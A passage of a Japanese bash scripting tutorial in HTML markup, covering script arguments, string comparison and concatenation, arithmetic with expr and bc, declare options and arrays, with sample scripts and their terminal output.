&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:input.sh" data-lang="bash:input.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$1&lt;/span> &lt;span class="nv">$2&lt;/span> &lt;span class="nv">$3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このコードは、端末に3つの値を出力します。&lt;br>
上記のコードをスクリプト「input.sh」に保存します。実行時に実行ファイル名に続き、三つの値を指定して、スクリプトに値を渡します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash input.sh BMW MERCEDES TOYOTA
$ BMW MERCEDES TOYOTA
$
&lt;/code>&lt;/pre>&lt;p>スクリプト実行時に渡した３つの値はそれぞれコードの中で、「BMW」は「$1」、「MERCEDES」は「$2」、「TOYOTA」は「$3」に値は入力されます。&lt;/p>
&lt;p>echoステートメントに「$0」を指定すると、スクリプト名も出力されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:input2.sh" data-lang="bash:input2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$0&lt;/span> &lt;span class="nv">$1&lt;/span> &lt;span class="nv">$2&lt;/span> &lt;span class="nv">$3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash input2.sh BMW MERCEDES TOYOTA
$ input2.sh BMW MERCEDES TOYOTA
$
&lt;/code>&lt;/pre>&lt;p>この目的のために配列を使用することもできます。&lt;br>
配列を宣言するには、コード &amp;lsquo;args=(&amp;quot;$@&amp;quot;)&amp;rsquo; を使用します。&lt;br>
このコード &amp;lsquo;args&amp;rsquo; は配列の名前であり、'@&amp;rsquo; は無限の数の値を持つ可能性があることを表します。&lt;br>
このタイプの配列宣言は、入力のサイズがわからない場合に便利です。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:args.sh" data-lang="bash:args.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">args&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">args&lt;/span>&lt;span class="p">[0]&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">args&lt;/span>&lt;span class="p">[1]&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">args&lt;/span>&lt;span class="p">[2]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>BMW&amp;rsquo;は${args[0]}、「MERCEDES」は${args[1]}、「HONDA」は${args[2]}を表します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash args.sh BMW MERCEDES TOYOTA
$ BMW MERCEDES TOYOTA
$
&lt;/code>&lt;/pre>&lt;p>以下に示すコードは、無限の数の値を持つ配列の値を出力できます。&lt;br>
前の例では、使用されるコマンド &amp;lsquo;echo ${args[0]} ${args[1]} ${args[2]}は配列の最初の3つの値のみを出力しますが、今回のコードは、出力を指定することなく、渡された値の全てを出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:args2.sh" data-lang="bash:args2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">args&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$@&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash args2.sh BMW MERCEDES TOYOTA
BMW MERCEDES TOYOTA
$ bash args2.sh BMW MERCEDES TOYOTA HONDA
BMW MERCEDES TOYOTA HONDA
$
&lt;/code>&lt;/pre>&lt;p>&amp;lsquo;echo $#&amp;rsquo; と書いて配列サイズを出力することもできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:args3.sh" data-lang="bash:args3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">args&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$@&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$@&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$#&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash args3.sh BMW MERCEDES TOYOTA
BMW MERCEDES TOYOTA
3
$ bash args3.sh BMW MERCEDES TOYOTA HONDA
BMW MERCEDES TOYOTA HONDA
4
$
&lt;/code>&lt;/pre>&lt;h2 id="文字列処理">文字列処理&lt;/h2>
&lt;h3 id="文字列の比較">文字列の比較&lt;/h3>
&lt;p>このトピックでは、文字列の比較を紹介します。&lt;br>
プログラムは、ユーザーから2つの文字列入力を受け取ります。&lt;br>
プログラムはそれぞれの値を読みこみ、２つの異なる変数 &amp;lsquo;st1&amp;rsquo; &amp;lsquo;st2&amp;rsquo; に格納します。&lt;br>
両方の変数の値を比較するには、「if」ステートメントを使用し、条件文に「==」演算子で、二つの文字列が等価であるかを判定します。&lt;br>
「else」ステートメントは、「文字列が一致しない」場合の処理を記述し、&amp;lsquo;if&amp;rsquo; ステートメントを閉じます。&lt;/p>
&lt;p>以下は、この手順全体のスクリプトコードです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:string.sh" data-lang="bash:string.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter Ist string&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> st1&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter 2nd string&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> st2&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$st1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$st2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;strings match&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;strings don&amp;#39;t match&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクリプトを「string.sh」に保存します。ターミナルからファイルを実行し、比較のために2つの文字列を与えます。異なる入力を使用してコードをテストすることもできます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash string.sh
enter Ist string
BMW
enter 2nd string
BMW
strings match
$
$ bash string.sh
enter Ist string
BMW
enter 2nd string
HONDA
strings don't match
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>文字列の比較は == です。&lt;/dd>
&lt;dd>数値の比較は -eq -gt -lt -ge です。&lt;/dd>
&lt;dd>-eq は[ == ] equals&lt;/dd>
&lt;dd>-gt は[ &amp;gt; ]greater than&lt;/dd>
&lt;dd>-lt は[ &amp;lt; ] less than&lt;/dd>
&lt;dd>-ge は[ &amp;gt;= ] greater equals です。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h3 id="連結">連結&lt;/h3>
&lt;p>2つの文字列を連結することもできます。&lt;br>
プルグラムはユーザーへ入力を促し、２つの変数を &amp;lsquo;st1&amp;rsquo; &amp;lsquo;st2&amp;rsquo; 変数に格納します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:connect.sh" data-lang="bash:connect.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter 1st string&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> st1&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter 2nd string&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> st2&lt;span class="p">;&lt;/span>
&lt;span class="nv">st3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$st1&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$st2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$st3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このコードを「connect.sh」に保存し、端末を使用してファイルを実行し、結果を確認します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash connect.sh
enter 1st string
BMW
enter 2nd string
HONDA
BMW HONDA
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>文字列の結合時にそれぞれの変数の間に空白を起きたい場合は、以下のように二つの変数を「&amp;quot; &amp;ldquo;」ダブるクォーテーションで囲みます。&lt;/dd>
&lt;dd>st3=&amp;quot;$st1 $st2&amp;rdquo;;&lt;/dd>
&lt;dd>
&lt;p>文字列を扱う場合、日頃から変数はダブルクォーテーションで囲む癖をつけておくべきです。&lt;/p>
&lt;/dd>
&lt;dd>変数への代入が「空（くうはく）」だった場合に、プログラムがバグにより停止します。&lt;/dd>
&lt;dd>
&lt;p>これは、文字列を扱う変数に限らず、次章で紹介する数値を格納する変数でも同じです。&lt;/p>
&lt;/dd>
&lt;dd>変数はつねに &amp;quot; &amp;quot; ダブルクオーテーションで囲みましょう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="数値計算処理">数値計算処理&lt;/h2>
&lt;p>このトピックでは、スクリプトを使用してさまざまな数値演算を実行する方法を学習します。&lt;br>
最初の方法では、２つの変数を値で定義し、echoステートメントと「+」演算子を使用してこれらの変数の合計を出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:numberCalc.sh" data-lang="bash:numberCalc.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">n1&lt;/span>&lt;span class="o">=&lt;/span>4&lt;span class="p">;&lt;/span>
&lt;span class="nv">n2&lt;/span>&lt;span class="o">=&lt;/span>20&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">+&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash numberCalc.sh
24
$
&lt;/code>&lt;/pre>&lt;h3 id="四則演算">四則演算&lt;/h3>
&lt;p>加算、減算、乗算、除算などの複数の操作を実行するための単一のスクリプトを書くこともできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:numberCalc2.sh" data-lang="bash:numberCalc2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">n1&lt;/span>&lt;span class="o">=&lt;/span>20&lt;span class="p">;&lt;/span>
&lt;span class="nv">n2&lt;/span>&lt;span class="o">=&lt;/span>4&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">+&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">-&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">*&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">/&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$((&lt;/span> n1 &lt;span class="o">%&lt;/span> n2 &lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash numberCalc2.sh
24
16
80
5
0
$
&lt;/code>&lt;/pre>&lt;h3 id="算術演算-exprコマンド">算術演算 exprコマンド&lt;/h3>
&lt;p>算術演算を実行する他の方法は、「expr」コマンドを使用することです。&lt;br>
この「expr」は、これらのn1とn2を他の変数とみなし、操作を実行することです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:numberCalc3.sh" data-lang="bash:numberCalc3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">n1&lt;/span>&lt;span class="o">=&lt;/span>20&lt;span class="p">;&lt;/span>
&lt;span class="nv">n2&lt;/span>&lt;span class="o">=&lt;/span>4&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> + &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash numberCalc3.sh
24
$
&lt;/code>&lt;/pre>&lt;p>「expr」を使用して四則演算を処理してみます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:numberCalc4.sh" data-lang="bash:numberCalc4.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">n1&lt;/span>&lt;span class="o">=&lt;/span>20&lt;span class="p">;&lt;/span>
&lt;span class="nv">n2&lt;/span>&lt;span class="o">=&lt;/span>4&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> + &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> - &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> &lt;span class="se">\*&lt;/span> &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> / &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> % &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash numberCalc4.sh
24
16
80
5
0
$
&lt;/code>&lt;/pre>&lt;h3 id="小数点の扱い-bcコマンド">小数点の扱い bcコマンド&lt;/h3>
&lt;p>exprコマンドなどは小数演算できません。&lt;br>
echoコマンドで数式を作成し、それをbcコマンドに渡して計算します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bc:bc.sh" data-lang="bc:bc.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=5; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESULT&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bc.sh
3.33333
$
&lt;/code>&lt;/pre>&lt;h2 id="bcコマンドでの小数点以下の指定桁数出力">bcコマンドでの小数点以下の指定桁数出力&lt;/h2>
&lt;p>演算の精度を保つため、上記のように計算は小数点以下5桁で行うけれど、表示は小数点以下2桁とかにしたい場合（桁数を指定したい場合）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:bc_f.sh" data-lang="bash:bc_f.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=5; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>
&lt;span class="nb">printf&lt;/span> &lt;span class="s2">&amp;#34;%.2f&amp;#34;&lt;/span> &lt;span class="nv">$RESULT&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bc_f.sh
3.33
$
&lt;/code>&lt;/pre>&lt;p>printf で桁数を指定します。&lt;br>
実は、bcコマンドでも桁数を指定できます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:bc_f.sh" data-lang="bash:bc_f.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 先に紹介した方法&lt;/span>
&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=5; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESULT&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1"># printfコマンドで２桁にする&lt;/span>
&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=5; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">printf&lt;/span> &lt;span class="s2">&amp;#34;%.2f\n&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESULT&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1"># bcコマンドで２桁にする&lt;/span>
&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=2; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESULT&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bc_f.sh
3.33333
3.33
3.33
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>bcコマンドで小数点以下の桁数を指定するためには、scale= で指定します。&lt;/dd>
&lt;dd>&amp;lsquo;;&amp;lsquo;セミコロンを忘れずに。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="declareコマンド">declareコマンド&lt;/h2>
&lt;p>bashには変数の型(int char stringなど）がないため、bashで変数の型を制限することはできません。&lt;br>
ただし、型のような動作を許可することができます。&lt;/p>
&lt;pre tabindex="0">&lt;code>declare [オプション] [変数名]=[値]
&lt;/code>&lt;/pre>&lt;h3 id="グローバル変数とローカル変数">グローバル変数とローカル変数&lt;/h3>
&lt;p>関数内で declare コマンドを使用すると、オプションがなければローカル変数として定義されます。-g オプションを使用すればスクリプト内のグローバルに変数を定義されます。スコープを明示しないと狭いスコープとなります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:declare.sh" data-lang="bash:declare.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">function&lt;/span> set_my_value&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="nb">declare&lt;/span> -x &lt;span class="nv">my_env_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ENV&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">declare&lt;/span> -g &lt;span class="nv">my_global_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;GLOBAL&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">declare&lt;/span> &lt;span class="nv">my_local_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;LOCAL&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">my_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;XXX&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
set_my_value&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$my_env_value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$my_global_value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$my_local_value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$my_value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>結果は以下の通りです。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash declare.sh
GLOBAL
XXX
$
&lt;/code>&lt;/pre>&lt;h3 id="整数として変数定義する">整数として変数定義する&lt;/h3>
&lt;p>-i を付ければ整数として変数を定義できます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:declare_i.sh" data-lang="bash:declare_i.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># -i で整数として変数を定義&lt;/span>
$ &lt;span class="nb">declare&lt;/span> -i &lt;span class="nv">num&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">001&lt;/span>
$ &lt;span class="nb">echo&lt;/span> &lt;span class="nv">$num&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash declare_i.sh
1
$
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:declare_no_i.sh" data-lang="bash:declare_no_i.sh">&lt;span class="c1"># -i がないと文字列となるのでそのまま&lt;/span>
$ &lt;span class="nb">declare&lt;/span> &lt;span class="nv">str&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">001&lt;/span>
$ decho &lt;span class="nv">$str&lt;/span>
$ &lt;span class="nb">echo&lt;/span> &lt;span class="nv">$str&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash declare_no_i.sh
001
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>オプションまとめ&lt;/dt>
&lt;dd>delcare -a: 配列を定義&lt;/dd>
&lt;dd>delcare -i: 整数として定義&lt;/dd>
&lt;dd>delcare -r: 読み取り専用変数として定義&lt;/dd>
&lt;dd>delcare -g: 関数内で使用時、グローバル変数として定義&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="配列">配列&lt;/h2>
&lt;p>配列を宣言し、その中に値を格納する方法を学びます。&lt;br>
好きなだけ値を保存できます。&lt;br>
配列の名前を書き、その値を「( )」括弧で定義します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array.sh" data-lang="bash:array.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array.sh
BMW TOYOTA HONDA
$
&lt;/code>&lt;/pre>&lt;p>「BMW」が「0」番目のインデックスに格納され、「TOYOTA」が「1」番目のインデックスに格納され、「HONDA」が「2」番目のインデックスに格納されます。&lt;br>
「BMW」を出力する場合は、${car[0]}と書きます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array2.sh" data-lang="bash:array2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">#printing value by using index&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing value using index&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[0]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[1]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
